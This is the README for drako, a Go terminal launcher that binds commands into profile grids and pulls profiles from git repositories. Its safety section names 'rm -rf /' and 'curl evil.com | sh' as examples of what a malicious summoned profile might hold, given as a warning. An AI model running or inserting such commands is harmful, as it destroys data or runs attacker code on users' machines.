# drako
\
[![GitHub tag (latest by date)](https://img.shields.io/github/v/tag/lucky7xz/drako?color=007D9C&label=version)](https://github.com/lucky7xz/drako/tags)
[![License](https://img.shields.io/github/license/lucky7xz/drako?color=orange)](https://github.com/lucky7xz/drako/blob/main/LICENSE)
[![Go Version](https://img.shields.io/github/go-mod/go-version/lucky7xz/drako?color=00ADD8&logo=go&logoColor=white)](https://go.dev/)

`drako` represents an entirely new species of terminal tools: the customizable **Command-Deck Launcher**. It is not a menu, nor a shell history. It is a brutalist **architectural framework for any CLI-based workflow**, solidifying your scattered commands, TUIs, and scripts into a cohesive control surface. As such, CLI-driven workflows become remarkably easy to document, distribute, teach, and scale across a team.

https://github.com/user-attachments/assets/21fb2340-bc74-4886-a629-8e95d116e830


## ✨ TLDR; 

`drako` is built on a few core principles:

-   **Harness, Don't Replace:** It integrates with the tools you already use. If it runs in the terminal, it can be bound to the grid.
-   **The Grid:** Your keyboard-based command center. It is technically `3-dimensional` and can fit up to 729 (9x * 9y * 9z) commands per `grid`, any of which can be accessed almost instantly using **Quick Navigation** (see below). Cycle through command grids or stash them in the `inventory` folder using `i`.
-   **Profiles, Decks, & Assets:** A `profile` consists of a `grid configuration` (size etc), a collection of commands (the `deck`), and `assets` (optional). Example: A `profile` can have a `deck` of Docker commands, and have Docker compose files as its `assets`. 
-   **Portable Specs:** All `profile` files exist in `~/.config/drako/`. You can download new `profile` setups from any `git` repository to your `inventory` folder using `drako summon`. You can even have multiple such `profiles` in a single repo (`specs`). Git-manage your own `spec` folder and `summon` your own control panel in an instant.

## 🚀 Quick Start

> Requires Go **1.24** or newer.

If Go is installed, installing `drako` is a single command.

```bash
go install github.com/lucky7xz/drako@latest
```

### Install Go

- Debian/Ubuntu: `sudo apt install golang`
- Arch: `sudo pacman -S go`
- macOS: `brew install go`
- Windows: `scoop install go` or `winget install GoLang.Go`

### Update

To update `drako` to the latest version, simply run the installation command again.

If you are not getting the latest version, use this command instead:
```bash
GOPROXY=direct go install github.com/lucky7xz/drako@latest  # update drako
```

### First run

Installing with Go is currently the only method (a `curl | sh` script is on the roadmap). Go drops binaries in `~/go/bin`, which usually isn't on your `PATH` yet — so on first run, launch drako by its full path:

```bash
go install github.com/lucky7xz/drako@latest   # install
~/go/bin/drako                                 # first run (PATH not set up yet)
```

Once it's open, the **Settings** cell in the Core profile has an **Add go/bin to PATH** command that writes the change to your shell config. Open a new shell afterward and you can just run `drako`.

> [!NOTE]
> **Emoji Support:** drako profiles sometimes use emojis as visual indicators. Modern terminals (Ghostty, WezTerm etc.) may support them by default. Others (older Linux terminals) may require installing a "Nerd Font" (e.g., [Nerd Fonts](https://www.nerdfonts.com/)) or specific emoji font packages (e.g., `fonts-noto-color-emoji`).

### Shell Integration

To enable `cd` on exit, see [docs/SHELL_INTEGRATION.md](docs/SHELL_INTEGRATION.md). 

### 🧭 Navigation

- **Grid Navigation:** Use arrows, `w/a/s/d`, or `h/j/k/l` (customizable in config.toml).
- **Quick Navigation:** For example : Pressing `2` and `3` in quick sequence moves the cursor to the 2nd column, 3rd row.
- **Switch Profile:** `Alt` + `1-9` to switch directly.
- **Cycle Profile:** `o` (prev) and `p` (next).
- **Profile Inventory:** `i`.
- **Lock Current Profile (for launching):** `r`.
- **Grid/Path Toggle:** `Tab`.
- **Path Mode:**
    - **Search:** `e` (type to filter, arrows to select, esc to cancel).
    - **Hidden Files:** `.` to toggle.
    - **Back:** `q` or `Esc`.
- **Quit:** `Ctrl+C` (Global), or `q` (Grid Mode).
- **Glassroot Mode (launch flag):** start with `drako --glassroot` for a sealed surface meant for SSH/Wish hosting (see Glassroot Mode below).

> **Customization:** Remap keys in `~/.config/drako/config.toml` under `[keys]`.


## 📇 Profile Creation Example

Create a new file with the `.profile.toml` extension. `drako` will discover it automatically.

 For example `~/.config/drako/networking.profile.toml`:

```toml
# Define grid size and theme for this profile.
x = 3
y = 4
theme = "dracula"

[[commands]]
name = "nmap LAN"
command = "nmap -sn 192.168.1.0/24"
col = "a"
row = 0
auto_close_execution = false       # Here we want to keep the window open after execution to actually see the output.

[[commands]]
name = "Bandwidth"
command = "bmon"
col = a
row = 1
# auto-close true per default      # Here we want to close the window after execution because bmon is a TUI.

```

## 👢 Bootstrap & 🧶 The Weaver

**The Bootstrap:** On first run, `drako` creates:
- `config.toml`: Global settings (Input Keys, Global Theme).
- `core.profile.toml`: The default command profile (Process Monitor, System Info, etc.)
- `themes.toml`: Color palettes. The built-in `dracula` theme lives in the binary as the fallback, so it no longer needs to be defined here.

**NOTE:** If you've customized your color schemes, keep a backup of your `themes.toml` — how themes are configured may change in a future release.

**NOTE:** Bootstrapping only occurs if files (config.toml and core.profile.toml) are missing. To clean-up, use `drako purge --interactive` or `drako purge --destroyeverything` (backup your work first).

**The Weaver:** Ensures cross-platform consistency. Inside the Drako binary lies a **Settings Template**, a **Core Template**, and a **[dictionary](internal/config/bootstrap/core_dictionary.toml)** of OS-specific defaults. When you run Drako for the first time, The Weaver "weaves" these together to create `~/.config/drako/core.profile.toml` tailored to your OS.

**Clean Slate:** The default inventory is intentionally minimal to avoid cluttering your workspace. You can summon curated command decks directly from the **Install Tools** menu in the Core profile, or use the CLI to summon them manually:

- **101 Series** ([Source](https://github.com/lucky7xz/101-deck)): `drako summon https://github.com/lucky7xz/101-deck.git`
- **GGML** ([Source](https://github.com/lucky7xz/ggml-deck)): `drako summon https://github.com/lucky7xz/ggml-deck.git`

```markdown
internal/config/bootstrap/      
├── settings_template.toml     # [Template] Global settings
├── core_template.toml         # [Template] Default profile commands
├── core_dictionary.toml       # [Dictionary] OS-specific command mappings
└── inventory/                 # [Profiles] Minimal default inventory (ssh-utils)
```

**NOTE:** If your OS specific dictionary is missing, feel free to create a pull request!


## 🧰 Power Tools

Beyond the TUI, Drako provides CLI commands for advanced management.

### 🪄 Summoning Profiles

Share and reuse command decks across machines and teams. Instead of manually copying profiles, summon them directly from remote sources:

```bash

# Clones the repo and looks for .profile.toml files.
# Discards the temporary repo

drako summon git@github.com:user/my_profile_collection.git
```

**NOTE:** Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in `inventory/`, validated before copying.

If a profile needs extra files (scripts, configs), declare it under `assets = ["relative/path/to/file", ...]`.
`drako` will copy these assets to `~/.config/drako/assets/<profile_name>/`.

You can then reference them in your commands using their full path. This can be useful when managing multiple ansible playbooks using drako, for example.

### 📚 Profile Specs 


Apply a "spec" to bulk-manage your profiles.

```bash
# Load a spec (e.g. ~/.config/drako/specs/example.spec.toml)
# Profiles listed are EQUIPPED (visible), others are STORED (inventory/).
# Useful for context switching (e.g. "Work Mode" vs "Gaming Mode").
drako spec example

# Stash profiles listed in the spec (move to inventory/).
# Useful for clearing a specific set of profiles without affecting others.
drako stash example

# Move all profiles to inventory/ (except Core)
drako strip

```

## ⚠️ Safety First

- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
- **When Unsure:** Consult documentation or ask a trusted friend/colleague.

## 🗑️ Purge

Safely reset or remove configurations.
```bash
# Remove Core profile (moves to trash/)
drako purge --target core

# Remove a specific profile (moves to trash/)
drako purge --target git

# Use interactive mode to purge profiles
drako purge --interactive

# Remove config.toml specifically (to trash/)
drako purge --config

# NUCLEAR OPTION: Delete everything in the .config/drako/ folder (NO TRASH, NO UNDO) 💀
drako purge --destroyeverything
```


## 🚑 Rescue Mode

If your configuration breaks (syntax error, invalid grid), Drako won't crash. It enters **Rescue Mode**.

- **Repair Tools:** Provides buttons to edit `config.toml`, open the config directory, or remove broken profiles.
- **Manual Access:** You can enter `[ Rescue Mode ]` manually via the **Inventory** (`i`).
- **Exit:** Select "Exit Rescue Mode" or switch to a working profile (`o`/`p`) to return to normal operation.


## 🧊 Glassroot Mode (experimental)

`drako --glassroot` launches a sealed, locked-down surface meant for serving drako over SSH with [Wish](https://github.com/charmbracelet/wish). drako ships no SSH server of its own — you write the Wish app, and run drako in glassroot mode inside it.

Over Wish the running program *is* the connection, so glassroot tucks away the local escape hatches that don't belong in a remote session:

- **No Rescue Mode.** A broken profile/config ends the session quietly rather than dropping a guest into Rescue Mode (which would reveal host paths and TOML).
- **No filesystem, inventory, or locking.** Path mode (`Tab`), Inventory (`i`), and Lock (`r`) are off.
- **No clipboard.** Copy (`y`) is disabled.
- A `🧊 G-ROOT` badge shows in the header.

Glassroot locks the interface, but the commands still do whatever they do — so it's worth curating the deck before you open it up. A good pre-flight:

- Equip just the profiles you'd like to share, and stash the rest.
- Give each command a once-over, including the TUIs they open — a command that opens a shell or writes files quietly widens what a guest can touch, with security implications worth taking seriously. The more familiar you are with what you're sharing, the more secure the hosting.

> Hosting drako over Wish is still experimental — feedback welcome.


## Roadmap 

 - [x] Update Bootstrap collection
 - [x] Summon profiles incl assets
 - [x] DRY Refactor  
 - [x] Grid Size Safety & Rescue Mode
 - [~] Glassroot Mode
 - [ ] Weaver-enabled adaptive user profiles
 - [ ] 

 ## Dev
 - [~] Full unit test suite
 - [ ] CI/CD
 - [ ] Install 
 - [ ] Auto Update

 ### Support
 - [~] MacOS support (untested)
 - [~] Windows support (untested)
 - [~] ARM Support
 - [ ] Mouse Support
 - [ ] Steamdeck Support
 - [ ] Touch Support
---

## 🤝 Contribution

Ideas are welcome. Bugs will be hunted.
-   **Issues:** Report defects or propose architectural changes.
-   **Pull Requests:** Fork the repository and submit your work.
-   **Alpha State:** `drako` is currently in (late) ALPHA. It is stable but evolving. This is your opportunity to influence its development.

---

## ❤️ Thanks to Charmbracelet

`drako` uses several Charmbracelet projects to deliver the TUI:

- [`bubbletea`](https://github.com/charmbracelet/bubbletea) for the model/view/update loop
- [`lipgloss`](https://github.com/charmbracelet/lipgloss) for layout and styling
- [`bubbles`](https://github.com/charmbracelet/bubbles) for common components



## 📜 License

The core Drako engine is released under the [GNU Affero General Public License v3.0](LICENSE). Bootstrap assets in the `bootstrap/` directory are released under either [MIT](bootstrap/LICENSE-MIT) or [Apache-2.0](bootstrap/LICENSE-Apache) licenses.

---
<div align="center">

Tame the chaos.

</div>
